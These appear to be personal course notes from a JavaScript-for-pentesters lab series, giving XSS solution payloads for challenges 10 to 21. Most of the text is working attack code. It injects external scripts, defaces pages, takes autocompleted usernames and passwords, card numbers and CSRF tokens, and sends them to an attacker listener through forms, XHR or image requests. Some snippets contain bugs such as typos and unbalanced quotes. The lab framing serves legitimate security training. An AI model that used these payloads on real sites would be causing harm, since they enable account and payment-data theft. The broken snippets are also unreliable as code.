                    Javascript For Pentesters
                    Course Notes Part 3


10 - Include External JS using JS
Similar to the previous challenge but you are not allowed to use the script tag in any way
As usual in the challenges there is an examination of the sample page source code.
The source code shows that the www passed to the url parameter is reflected within a script
The solution is to create a new script tage and then bind it to the source JS script
Solution Syntax
  var newtag = document.createElement("script");
  newtag.type  = "text/javascript";
  newtag.src = "script url";
  doucument.body.appendChild(newtag);
As usual encode and add to the url parameter


11 - Replacing Banner Image
Replacing the exiting image with a defacement image using JS only
Solution Syntax
  <script>
    document.getElementsByTagName("img")[0].src = "image url"    
  </script>
As usual encode and add to the url parameter
This is only happening on the client side only so the server remains untouched


12 - Stealing From Auto-Complete
Task is to complete an auto-complete option for the page and then wait for 10 seconds before submitting details to the attacker
Again the url parameter is used to mimic a XSS attack
As has been done before there is a server running
  - python -m SimpleHTTPServer 9000  -- This will start a server on port 9000
Solution Syntax
  <script>
    // This will allow the malicious code to be triggered after a specified time
    // In most programming languages it will be in milliseconds
    window.setTimeout(function(){
      document.forms[0].action = 'http://localhost:9000';
      document.forms[0].submit();
    }, 10000);
  </script>
Again as is standard practice script is encoded


13 - Posting with XmlHTTPRequest
Similar to the previous example but using XHR instead
Password should have already been saved in auto-complete
Solution Syntax
  <script>
    // Getting the password and username
    username = document.forms[0].elements[0].value;
    password = document.forms[0].elements[1].value;
    
    window.setTimeout(function(){
      // The XHR request
      var req = new XMLHttpRequest();
      req.open("GET", "http://localhost:8000/?username="+username+"&password="+password, true);
      req.send();
      
      // For checking 
      // alert(username + ":" password);
    }, 10000);
  </script>


14 - Fetch Data With XMLHttpRequest
Find and display a users email address from a different page
When viewing the source code for the page there is a comment
  - Email can be obtained using a GET request to a specific url with the users username
This is a fairly common scenario once an XSS vulnerability has been discovered
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      // Checks to see is there data waiting from the server
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML() = req.responseText; 
      }
    }
    
    // The lab has a specific url
    req.open("GET", "/lab/url/name=username", true);
    req.send();
  </script>


15 - Data Exfiltration With XMLHttpRequest
Use the xss on the page post the user credit card number to the attack server
Similar to the previous challenge the source code gives a hint
  - This time it is a POST request to a specific url with the users name
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      // Checks to see is there data waiting from the server
      if(req.readyState == 4 && req.status == 200){
        alert(req.responseText);
        new Image.src() = "http://localhost:8800/?cardno=" + req.responseText; 
      }
    }
    
    req.open("POST", "lab url", true);
    
    // Using POST instead of GET means that you have to list the content type
    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.send("user=username");
  </script>


16 - Extracting CSRF Tokens
CSRF - Cross Site Request Forgery
A lot of sites require CSRF tokens to preven forgery attacks
Javascript can read CSRF tokens
In the sample app the CSRF token is part of the url but this is not true of all sites
CSRF placement can be dependent on both developer and framework
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML = req.responseText;
      }
    }
    
    // Gets the url and splits it using the ampersand as a delimiter
    var token = window.location.search.split('&')[1];
    req.open("GET", "lab url/email?name=username&"+token, true);
    req.send();
  </script>
If you are vulnerable to XSS then CSRF protections are useless

17 - Stealing CSRF Tokens
Find user email address & display it in a div name result
No hardcoding can be used everything must be done dynamically
There are also hints available in the source code of the sample web page
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML = req.responseText;
      }
    }  
    
    // Gets the elements and splits
    var uid = document.getElementById("uid").innerHTML.split(':')[1];
    var token = document.getElementById("csrf").innerHTML.split(':')[1];
    req.open("GET", "lab url/email?uid="+uid+"&csrf_token="+token, true);
    req.send();
  </script>


18 - HTML Parsing Of XHR Response
This type of attack has many different use cases
  - EG Mining data received from an XHR attack
The task to to parse HTML received as a respoonse during the attack which differs from previous examples that have used
string returns
Examining the source code gives the URL that will be used
HTML support using XHR is only available using asychronous
  - It is also only available if you set responseType to document
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var htmlPage = req.responseXML;
        var address = htmlPage.getElementById("address").innerHTML;
        alert(address);
        document.getElementById("result").innerHTML = address;
      }
    };
    
    req.open("GET", lab url, true);
    req.responseType = "document";
    req.send()
  </script>
There maybe different browser support for this, 

19 - Multilevel HTML Parsing
Similar to the previous exercise
The task is to use an XHR vulnerability to get a user's credit card number, display it in a div and send to attack server
User Settings link has CSRF token
One the user settings page source code there is a hidden forms with random CSRF value
HTML will have to be parsed twice to solve the challenge
Solution Syntax
  <script>
    var link = document.getElementById(settingd");
    
    // The XHR request
    var req = new XMLHttpRequest();
    
    var csrf_token = '';
    var uid = '';
    
    var req2 = new XMLHttpRequest();
    
    // A handler for when the server responds
    req2.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var htmlPage = req2.responseXML;
        var credit_card = htmlPage.getElementById("result").innerHTML;
        document.getElementById("result").innerHTML = credit_card;
        new Image.src() = "http://localhost:8800/?credit_card_number=" + credit_card;
      }
    };
    
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var htmlPage = req.responseXML;
        csrf_token = htmlPage.forms[0].elements[1].value;
        alert(csrf_token);
        
        req2.open("GET", "lab url ?uid="+uid+"&csrf_token="+csrf_token, true);
        req2.responseType = "document";
        req2.send();
      }
    };
    
    uid = link.innerHTML.split(':')[1];
    req.open("GET", link.href, true);
    req.responseType = "document";
    req.send();
  </script>


20 - Multilevel JSON parsing
Data is exchanged in web apps a lot using the JSON format, this is especially true using API on different portal
Like in previous challenges the user pass will have to be displayed in a div called result, also like before the
page contains an XSS vulnerability
Examining the source code of the page gives a hint that there is 2 JSON API being used, getting the password and using the 
token returned by the first API as the input for the second
A lot of this solution comes from the previous solution
Solution Syntax
  <script>
    var link = document.getElementById(settingd");
    
    // The XHR request
    var req = new XMLHttpRequest();
    var req2 = new XMLHttpRequest();

    var csrf_token = '';
    var uid = '';
    
    // A handler for when the server responds
    req2.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var pass_obj = JSON.parse(req2.responseText);
        var password = pass_obj.resp.password;
        document.getElementById("result").innerHTML = password;
        new Image.src() = "http://localhost:8800/?password="+password+"&uid="+uid;
      }
    }
    
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        response_obj = JSON.parse(req.responseText);;
        token = response_obj.params.token;
        
        req2.open("GET", "lab url /getpassword?token="+token, true);
        req2.responseType = "document";
        req2.send();
      }
    };
    
    uid = link.innerHTML.split(':')[1];
    req.open("GET", "lab url/gettoken?uid="+uid, true);
    req.send();
    
  </script>

21 - Multilevel XML parsing
This can be thought of as a natural accompanier to the previous 2 challenges
Again much of the task is the same as previoud with the same qualifications used eg no hardcoding values
You will need to find API and query them.
There is an api endpoints link which gives and XML output
Solution Syntax
  <script>
    var link = document.getElementById(settingd");
    
    // The XHR requests
    var req = new XMLHttpRequest();
    var req2 = new XMLHttpRequest();
    
    var csrf_token = '';
    var uid = '';
    
    // A handler for when the server responds
    req2.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var questions = JSON.parse(req2.responseText);
        document.getElementById("result").innerHTML = questions.q1 + "<br>" +questions.q2 + "<br>" +questions.q3;
      }
    }
    
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        uid = req.responseXML.getElementsByTagName("uid-param-value")[0].childNodes[0].nodeValue;
        token = req.responseXML.getElementsByTagName("token-param-value")[0].childNodes[0].nodeValue;
        
        req2.open("GET", "lab url /questions?uid="+uid+"&token="+token, true);
        req2.send();
      }
    };
    
    req.open("GET", link.href, true);
    req.send();
  </script>
